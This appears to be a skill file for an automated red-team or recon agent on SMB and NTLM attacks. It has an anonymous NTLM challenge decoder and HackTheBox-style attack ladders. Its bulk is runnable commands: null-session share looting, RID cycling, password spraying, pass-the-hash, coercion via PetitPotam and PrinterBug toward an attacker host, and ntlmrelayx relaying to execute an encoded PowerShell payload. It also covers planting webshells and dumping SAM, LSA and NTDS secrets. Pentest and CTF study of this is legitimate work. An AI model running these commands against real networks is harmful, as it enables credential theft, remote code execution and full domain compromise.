---
name: SMB and NTLM
description: Enumerate and abuse SMB/NTLM — null/guest share enum, spidering, RID cycling, anonymous NTLM Type-2 topology leaks, and coercion+relay ladders to reach code exec.
tags: [ntlm, smb, active-directory, info-disclosure, iis, recon, netexec, smbclient, smbmap, relay, coercion, rid-cycling, kerberos, nfs, null-session]
recommended_tools: [http_request, http_repeater, nmap_scan, netexec_scan, curl, python3, nuclei_scan]
vuln_classes: [info_disclosure]
domain: network
phase: reconnaissance
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-ntlm-info/SKILL.md]}
---

# SMB/NTLM Information Disclosure

Anonymous NTLM/Negotiate challenge capture leaks internal AD topology from internet-reachable
Windows infrastructure. The leak itself is RFC-compliant NTLMSSP behavior (MS-NLMP), but on
public-facing enterprise services it hands the attacker exact reconnaissance for the next stage:
internal NetBIOS/DNS domain, forest root, computer name, and an AD-synced timestamp — all extracted
from the AV_PAIRS structure of the server's Type-2 message, with no credentials.

CWE-200 (Exposure of Sensitive Information). Standalone severity is usually Low/Informational; it
becomes Medium when it discloses internal AD topology or accelerates a credential spray / NTLM relay
chain on the same host.

## When to run

- Target advertises `WWW-Authenticate: NTLM` or `WWW-Authenticate: Negotiate` anonymously.
- Server header shows `Microsoft-IIS/*`, `Microsoft-HTTPAPI/2.0`, or IIS-fronted apps.
- SMB (445/tcp) is reachable and you want the domain/OS/hostname before authenticated enumeration.

## High-value targets

- Internet-reachable IIS / SharePoint / Exchange / OWA with dual auth (Forms + NTLM, or NTLM + Kerberos).
- Citrix NetScaler / VMware Horizon gateways with NTLM-backed AD auth.
- Lync / Skype for Business / Teams On-Prem edge servers.
- WSUS admin paths, HCL Sametime / Domino NTLM proxies.
- Legacy SharePoint farms that left NTLM enabled on the public-zone IIS binding.

## Attack surface signals

Response headers that signal NTLM is offered:

```
WWW-Authenticate: NTLM
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM, Negotiate
WWW-Authenticate: Negotiate, NTLM
```

URL paths where NTLM is commonly exposed:

```
/_api/web/CurrentUser            SharePoint REST
/_vti_bin/*.asmx                 SharePoint legacy SOAP (Lists.asmx, Authentication.asmx)
/EWS/Exchange.asmx               Exchange Web Services
/Autodiscover/Autodiscover.xml   Exchange autodiscover
/owa/  /ecp/  /rpc/              Outlook Web App / ECP / RPC-over-HTTP
/Microsoft-Server-ActiveSync     ActiveSync
/PowerShell                      Exchange Mgmt Shell over HTTPS
/api/v3/                         TeamCity / Atlassian
/wsus/                           Windows Server Update Services
/aspnet_client/                  IIS/ASP.NET management paths
```

## Methodology

### Gate 0 — confirm NTLM is offered anonymously

Send a vanilla anonymous request and inspect headers. If no NTLM/Negotiate challenge is returned,
stop — there is no disclosure surface here.

```bash
curl -sk -I "https://target.example/_api/web/CurrentUser" | grep -i "WWW-Authenticate"
```

### 1. Send an anonymous NTLMSSP Type-1 message

The Type-1 base64 below sets the standard negotiate flags (`NEGOTIATE_UNICODE | NEGOTIATE_OEM |
NEGOTIATE_NTLM | ALWAYS_SIGN | KEY_EXCH | 56 | 128 | TARGET_INFO`) and an OS-version field of
Windows 7 build 7601 (`06 01 B1 1D 00 00 00 0F`) that virtually every NTLM responder accepts:

```
Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
```

### 2. Use a keep-alive connection, not a one-shot

Most HTTP clients close the socket between the Type-1 send and the Type-2 response, so a one-shot
`curl` often shows nothing. To capture the full Type-2:

- **http_repeater** (or Burp Repeater) with `Connection: keep-alive` set explicitly.
- **http_request** issued over a persistent HTTP/1.1 connection.
- **python3** raw `socket` + `ssl` (decoder below).

### 3. Parse the Type-2 challenge

Base64-decode the `WWW-Authenticate: NTLM <base64>` header value. Structure per MS-NLMP:

- Bytes 0-7: literal `NTLMSSP\0`
- Bytes 8-11: MessageType `\x02\x00\x00\x00`
- Bytes 12-19: TargetName SecurityBuffer (len, alloc, offset)
- Bytes 20-23: NegotiateFlags
- Bytes 24-31: Server Challenge (8 bytes — useful for offline cracking / relay context)
- Bytes 40-47: TargetInfo SecurityBuffer (len, alloc, offset)
- TargetInfo body: `AV_PAIRS` array of `(AvId u16, AvLen u16, Value)`

### 4. Decode the AV_PAIRS

| AvId | Meaning | Value to attacker |
|------|---------|-------------------|
| 1 | NetBIOS Computer Name | server short name |
| 2 | NetBIOS Domain Name | legacy `DOMAIN\user` spray format |
| 3 | DNS Computer Name | FQDN of the responder |
| 4 | DNS Domain Name | the AD domain (UPN suffix) |
| 5 | DNS Tree Name | AD forest root — reveals parent-forest membership |
| 7 | Timestamp | FILETIME; NTLMv2 relay/crack context, clock-sync intel |
| 9 | Target Name | newer NTLMSSP |

### 5. Map findings to severity

- Internet-exposed + default `WIN-XXXXXXXXXXX` hostname + corporate-AD-tree disclosure → **Medium**.
- Internet-exposed + named-server hostname (`SPWEB01.corp.example`) + corporate tree → **Low-Medium**.
- Intranet-only / VPN-gated, any disclosure → **Informational** (intended NTLM behavior — drop it).

### 6. Enrich for the next stage

- `AV[5]` DNS Tree Name often reveals a *parent forest* (e.g. `customer.parent-corp.example` shows
  the tenant is a child domain inside a corporate global AD, not an isolated tenant).
- `AV[2]` + `AV[4]` give both `DOMAIN\user` and `user@dns.domain` spray formats — the missing recon
  for a credible password spray.
- `AV[7]` within ~5s of the `Date:` header confirms an AD-synced clock (Kerberos-relevant).

## Tooling

### Anonymous Type-1 probe (quick confirm)

```bash
curl -sk -I -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
  "https://target.example/_api/web/CurrentUser" 2>&1 | grep -i "WWW-Authenticate"
```

### http_request / http_repeater (full Type-2 capture)

```
GET /_api/web/CurrentUser HTTP/1.1
Host: target.example
Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
Connection: keep-alive
User-Agent: Mozilla/5.0

```

### python3 raw socket + AV_PAIR decoder (canonical repro)

```python
import socket, ssl, base64, struct, re
from datetime import datetime, timezone

HOST = "target.example"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)
s.sendall(
    f"GET /_api/web/CurrentUser HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==\r\n"
    "User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()
)
data = b""
while True:
    chunk = s.recv(8192)
    if not chunk: break
    data += chunk
    if b"\r\n\r\n" in data: break

m = re.search(rb"WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]{20,})", data, re.I)
if m:
    b = base64.b64decode(m.group(1).decode("ascii"))
    assert b[:8] == b"NTLMSSP\x00"
    tn_len, _, tn_off = struct.unpack_from('<HHI', b, 12)
    ti_len, _, ti_off = struct.unpack_from('<HHI', b, 40)
    print(f"TargetName: {b[tn_off:tn_off+tn_len].decode('utf-16-le', errors='ignore')!r}")
    av_types = {1:'NetBIOS Computer Name', 2:'NetBIOS Domain Name',
                3:'DNS Computer Name', 4:'DNS Domain Name',
                5:'DNS Tree Name', 7:'Timestamp', 9:'Target Name'}
    i = 0
    ti = b[ti_off:ti_off+ti_len]
    while i < len(ti):
        av_id, av_len = struct.unpack_from('<HH', ti, i)
        if av_id == 0: break
        val = ti[i+4:i+4+av_len]
        if av_id == 7:
            ts = struct.unpack('<Q', val[:8])[0]
            secs = (ts - 116444736000000000) / 10000000
            vs = datetime.fromtimestamp(secs, tz=timezone.utc).isoformat()
        else:
            vs = val.decode('utf-16-le', errors='ignore')
        print(f"  AV[{av_id}] {av_types.get(av_id, '?'):28s}: {vs!r}")
        i += 4 + av_len
```

### SMB-side extraction (445/tcp)

The same AD facts (domain, OS build, hostname, signing posture) are also disclosable over SMB:

```bash
nmap_scan -p445 --script smb-os-discovery,smb-security-mode,smb2-security-mode target.example
netexec smb target.example          # domain, OS, SMB signing, null-session posture
```

Note SMB signing status: `signing: False` on a domain host is a direct NTLM-relay enabler — pair
the captured NTLMSSP challenge context with a relay path (`ntlmrelayx`) where in scope.

### nuclei_scan detection

```bash
nuclei_scan -u https://target.example -tags ntlm,exposure
```

## Root causes

1. Dual-auth IIS bindings on the public zone — NTLM left enabled even when Forms is the intended entry.
2. Server never renamed from the Windows-installer `WIN-XXXXXXXXXXX` hostname (lazy-provisioning tell;
   predicts default service-account passwords and other weak hygiene).
3. Sub-domain joined to a corporate forest without zone isolation, disclosing forest membership.
4. IIS Extended Protection = `None` (default) — the NTLM challenge is sent to any anonymous client.
5. `WindowsAuthentication` not removed from `applicationHost.config` for internet-exposed SharePoint sites.

## Mitigations (for validation / reporting)

| Defense | Effect |
|---|---|
| Disable NTLM on the public IIS binding (Forms-only) | Best — eliminates the surface |
| IIS Extended Protection = Required | Restricts NTLM challenge to authenticated callers; AV-pair leak mitigated |
| Reverse-proxy strips `WWW-Authenticate` from anonymous responses | Partial; can break legitimate clients |
| Enforce SMB signing (`RequireSecuritySignature`) | Kills the relay-chain uplift |
| Move SP/Exchange farm to a child AD with no cross-trust | Mitigates forest disclosure only |

## Validation gate

1. **What can the attacker do right now?** Internet-exposed + default hostname + corporate forest
   disclosed → Medium (UPN/SAM spray format + likely-default accounts). Intranet-only or NetBIOS-only
   → Informational.
2. **Reproducible in under 5 minutes from a fresh shell?** Include the python3 decoder output verbatim.
3. **Chained impact present?** Pure topology disclosure is Low; report as Medium+ only when it feeds
   a spray/relay/enumeration chain on the same host.

## Chaining

- **SharePoint** → anonymous Type-2 on `/_vti_bin/Lists.asmx` → AV_PAIR decode → internal forest name.
- **Credential spray / M365** → leaked NetBIOS domain + UPN suffix → cross-reference the Entra tenant
  via `https://login.microsoftonline.com/<dns.domain>/.well-known/openid-configuration` → error-
  differential username enumeration, then spray.
- **NTLM relay** → SMB signing disabled on the disclosed host → relay a coerced/captured NTLM auth to
  SMB/LDAP/HTTP where in scope.
- **OSINT** → `WIN-XXXXXXXXXXX` hostname flags a low-maturity org → deeper recon (cert transparency,
  code leakage, breach corpus) is high-yield.

## Real-world scenarios

**A — SharePoint inside a parent corporate AD.** Anonymous Type-1 to `/_api/web/CurrentUser` returned
a Type-2 whose AV_PAIRS decoded to NetBIOS domain `<Customer>`, computer `WIN-XXXXXXXXXXX`, DNS domain
and tree `customer.parent-corp.example`, and a live timestamp. Three escalations: default hostname
(never renamed → likely default backend creds), child-domain-inside-corporate-forest (cross-trust
risk), and known UPN format for spraying. Reported Medium; chained with an anonymous
`Authentication.asmx` brute-force endpoint it became a Critical combined attack.

**B — Exchange edge with NTLM-protected EWS.** `https://mail.example.com/EWS/Exchange.asmx` Type-1
returned DNS tree `corp.example.com` and computer `MAIL01.corp.example.com`, confirming the edge is
domain-joined to corporate AD rather than a DMZ-isolated AD. The leaked UPN + server-name format
removes the recon step from a spray. Low-Medium.

**C — Intranet-only intentional leak (not a finding).** A VPN-gated internal host returns the full
AV-pair set; this is intended NTLM behavior visible to any authenticated VPN user (equivalent to
`nltest /dsgetdc:`). Recognize and drop.

## Real-world chains (0xdf HTB)

Internal-network SMB/NTLM ladders as 0xdf runs them across dozens of AD boxes. Enumerate anonymously
first, expand access as creds/hashes drop, end at share-driven code exec or relay. Run against
445/tcp (and 139) from a foothold on the target subnet. `nxc` = netexec (crackmapexec on older kits).

### Fingerprint + signing posture (always first)

Signing status decides whether relay is on the table. Do this before anything else.

```bash
nxc smb <IP>                                   # host banner: name, domain, OS, signing, SMBv1
nxc smb <SUBNET>/24                            # sweep a range, spot the DC and file servers
nxc smb <IP> --generate-hosts-file hosts       # write <IP> <DC_FQDN> to /etc/hosts (Kerberos needs it)
nmap -p139,445 --script smb-os-discovery,smb2-security-mode <IP>
```

PROOF: `signing:False` on a domain host = relay target. Banner gives `<DOMAIN>` and DC hostname for
every downstream command; add the FQDN to `/etc/hosts` before any `-k` Kerberos auth.

### Null / guest session share enumeration (highest-frequency first move)

No creds yet: try null (`-u '' -p ''`) then `guest`. This lands on the majority of HTB AD boxes
(Cicada, SolarLab, Escape, Support, Retro, Phantom, Breach, Coder, Authority, RetroTwo, EscapeTwo…).

```bash
nxc smb <IP> -u '' -p '' --shares                       # null session
nxc smb <IP> -u guest -p '' --shares                    # guest fallback (very common)
smbclient -N -L //<IP>/                                 # list shares, no auth
smbclient -N //<IP>/<SHARE>                             # read a specific share anonymously
smbmap -H <IP> -u guest -p ''                           # shares + R/W perms in one view
```

PROOF: a share row with `READ`/`READ, WRITE` under an unauthenticated user. Non-default shares (not
`IPC$`/`ADMIN$`/`C$`/`print$`) with READ are the lead — e.g. `public`, `HR`, `Documents`, `Shares`,
`support-tools`, `Development`, `software$`. `IPC$` READ still enables RID cycling below.

### Spider readable shares → loot creds/config (do this every time a share reads)

Pull everything and grep for secrets. `SYSVOL`/`NETLOGON` on a DC hold logon scripts (`login.vbs`)
with cleartext creds; user shares hold config, backup, and Office files.

```bash
nxc smb <IP> -u <USER> -p '' -M spider_plus                        # index all shares to JSON
nxc smb <IP> -u <USER> -p '' -M spider_plus -o DOWNLOAD_FLAG=True   # auto-download everything
smbclient //<IP>/<SHARE> -U '<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'
grep -rniE 'password|passwd|pwd|cpassword|connectionstring|secret|api[_-]?key' ./loot/
```

Recurring loot 0xdf pulls and how to crack it open:

- Office files (`.xlsx`, `.accdb`, `.docx`) — creds in cells or notes (`accounts.xlsx`, `staff.accdb`,
  `details-file.xlsx`, `Access_Review.xlsx`). A corrupt `.xlsx` is a ZIP: repair the header
  (`50 4B 03 04`) then read `xl/sharedStrings.xml` for the strings. PROOF: cleartext cred string.
- `.sqlconfig` / connection strings / Ansible vault (`svc` creds), `cpassword` in GPP
  (`gpp-decrypt`), README/notice files naming a default shared password (`Notice from HR.txt`,
  `SQL Server Procedures.pdf` → `PublicUser:...`).
- Binaries + DLLs (`overwatch.exe`, `Encrypter.exe`, `UserInfo.exe.zip`, WIM images from `images$`) —
  pull for reversing/offline analysis.

PROOF: a credential, connection string, or private key recovered from a downloaded file → feed
straight into the next auth attempt.

### RID cycling → domain user list (turn anonymous SMB into a target list)

If null/guest can touch `IPC$`, walk RIDs to build the user list without a real account. This is the
second-highest-frequency move (Breach, Sendai, Phantom, Sweep, Cicada, SolarLab, Retro, babytwo…).

```bash
nxc smb <IP> -u guest -p '' --rid-brute                 # or -u '' -p ''
lookupsid.py '<DOMAIN>/guest@<IP>' -no-pass
impacket-lookupsid anonymous@<IP> -no-pass
```

PROOF: `SidTypeUser` rows resolving `<DOMAIN>\<name>` (e.g. 15–30 users; svc/service accounts like
`svc_mssql`, `svc_inventory_*` are prime AS-REP/Kerberoast/spray targets). Save SAM names to a userlist.

### Non-SMB user/cred harvesting (fold into the same userlist)

When SMB is locked down, other anonymous services on the same box leak the same recon.

```bash
ftp anonymous@<IP>                                      # /Homes → per-user folders = usernames
nxc nfs <IP> --enum-shares                              # NFS (2049) readable exports
nxc nfs <IP> --share <SHARE> --get-file <REMOTE> <LOCAL>
```

PROOF: usernames harvested from FTP `/Homes` (often + a note naming a weak shared password), or a
file pulled from an NFS export (e.g. incident-report PDF revealing a hidden service/DNS record).

### Kerberos-only auth (NTLM disabled — use `-k`)

Hardened DCs disable NTLM; auth must go over Kerberos. Requires the DC FQDN in `/etc/hosts` and clock
sync (Voleur, VulnCicada). Everything else (`--shares`, `--rid-brute`) works with `-k` appended.

```bash
ntpdate <DC_IP>                                          # or: faketime / rdate — fix clock skew first
nxc smb <DC>.<DOMAIN> -u <USER> -p <PASS> -k             # validate creds over Kerberos
nxc smb <DC>.<DOMAIN> -u <USER> -p <PASS> -k --shares
smbclient -U '<DOMAIN>/<USER>%<PASS>' -k //<DC_HOST>/<SHARE>
```

PROOF: Kerberos auth success where plain NTLM returned `STATUS_NOT_SUPPORTED`; readable non-default
share (e.g. `CertEnroll` → ADCS present; `IT`/`Finance`/`HR` → sensitive `.xlsx`).

### Validate creds / spray across the subnet

Every recovered cred gets checked everywhere — SMB reuse is the norm. Also assess relay exposure at
the LDAP layer.

```bash
nxc smb <IP> -u <USER> -p <PASS>                         # (Pwn3d!) = local admin
nxc smb <IP> -u <USER> -H <HASH>                         # pass-the-hash
nxc smb <SUBNET>/24 -u <USER> -p <PASS> --continue-on-success   # spray reuse
nxc smb <IP> -u users.txt -p <PASS> --continue-on-success       # single pw, many users
nxc ldap <DOMAIN> -u '' -p '' -M ldap-checker            # LDAP signing / channel binding posture
```

PROOF: `[+] <DOMAIN>\<USER>:<PASS>`, the `(Pwn3d!)` tag (local admin → code exec), or
`LDAP signing not required / channel binding not enforced` (LDAP relay is viable).

### Coercion + NTLM relay → creds / code exec

When signing is off, coerce a privileged account to authenticate to your relay. Highest-impact chain
when a machine account or admin can be forced to connect.

```bash
# 1) start the relay: SMB->SMB dumps SAM; SMB->LDAP can add a computer / RBCD
impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support               # dump SAM on relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <B64>'  # relay to exec
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access             # LDAP: RBCD/shadow

# 2) capture or coerce the auth
responder -I <IFACE>                                                # passive: LLMNR/NBT-NS/mDNS
coercer coerce -u <USER> -p <PASS> -t <VICTIM_IP> -l <ATTACKER_IP>  # force auth (Petit/Print/etc)
petitpotam.py <ATTACKER_IP> <DC_IP>                                 # MS-EFSR coercion
printerbug.py '<DOMAIN>/<USER>:<PASS>'@<VICTIM_IP> <ATTACKER_IP>    # MS-RPRN coercion
```

PROOF: ntlmrelayx prints `[*] Authenticating against ... SUCCEED`, then SAM hashes / a created
machine account / executed command output. Relay only works where `signing:False` (and LDAP relay
where the ldap-checker above said signing/CB not enforced).

### Share write → code execution

A writable share crossed with a known execution trigger is code exec. Match the write target to how
it gets run. A writable `share` under guest (Breach) is enough to plant a coercion file.

```bash
smbmap -H <IP> -u <USER> -p <PASS>                       # find a WRITE share
smbclient //<IP>/<SHARE> -U '<USER>%<PASS>' -c 'put payload.exe'
nxc smb <IP> -u <USER> -p <PASS> -x 'whoami'             # writable ADMIN$/C$ → psexec-style exec
impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<IP>            # SMB->service->SYSTEM shell
```

Write-to-trigger patterns worth checking on a writable share:

- `.scf` / `.url` / `.lnk` / `desktop.ini` icon file → coerces SMB auth from any browsing user (feed
  Responder/relay above). PROOF: hash lands in Responder.
- A directory a scheduled task / web root / cron picks up → drop the payload (`.aspx` webshell,
  script) and hit the trigger. PROOF: shell callback.
- `ADMIN$`/`C$` writable (implies local admin) → straight to `psexec`/`nxc -x`. PROOF: `NT
  AUTHORITY\SYSTEM` from `whoami`.

### Post-admin: dump secrets

Once `(Pwn3d!)`, harvest for lateral movement.

```bash
nxc smb <IP> -u <USER> -p <PASS> --sam --lsa            # local SAM + LSA secrets
nxc smb <IP> -u <USER> -H <HASH> --ntds                 # DC only: DCSync the domain
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<IP>
```

PROOF: `<user>:<rid>:<lmhash>:<nthash>:::` lines. Machine/krbtgt/admin hashes → pass-the-hash,
silver/golden tickets, domain compromise.
